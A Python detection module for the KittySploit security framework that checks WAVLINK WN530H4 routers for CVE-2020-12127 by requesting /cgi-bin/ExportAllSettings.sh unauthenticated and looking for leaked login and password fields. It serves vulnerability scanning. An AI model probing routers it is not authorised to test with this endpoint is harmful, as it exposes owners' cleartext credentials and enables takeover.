#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WAVLINK WN530H4 M30H4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WAVLINK WN530H4 M30H4.V5030.190403 - Information Disclosure Detection',
        'description': 'WAVLINK WN530H4 M30H4.V5030.190403 contains an information disclosure vulnerability in the /cgi-bin/ExportAllSettings.sh endpoint. This can allow an attacker to leak router settings, including cleartext login details, DNS settings, and other sensitive information without authentication.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'wavlink', 'exposure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cerne.xyz/bugs/CVE-2020-12127',
            'https://www.wavlink.com/en_us/product/WL-WN530H4.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-12127',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-12127',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/ExportAllSettings.sh', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Login=', 'Password=', 'Model=', 'AuthMode=',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="WAVLINK WN530H4 M30H4.V5030.190403 - Information Disclosure detected",
                path='/cgi-bin/ExportAllSettings.sh',
            )
            return True
        return False

